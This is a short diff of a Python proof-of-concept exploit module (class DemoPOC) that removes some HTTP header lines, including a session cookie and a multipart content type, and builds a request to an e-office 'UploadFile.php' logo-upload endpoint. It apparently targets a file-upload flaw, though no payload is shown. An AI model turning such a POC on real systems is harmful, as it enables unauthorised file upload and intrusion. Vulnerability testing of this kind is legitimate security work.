@@ -33,9 +33,6 @@ class DemoPOC(POCBase):
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ",
         "Accept-Encoding": "gzip, deflate",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-        "Connection": "close",
-        "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4",
-        "Cookie":"LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348"
         }
         url = self.url.rstrip(
             '/') + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
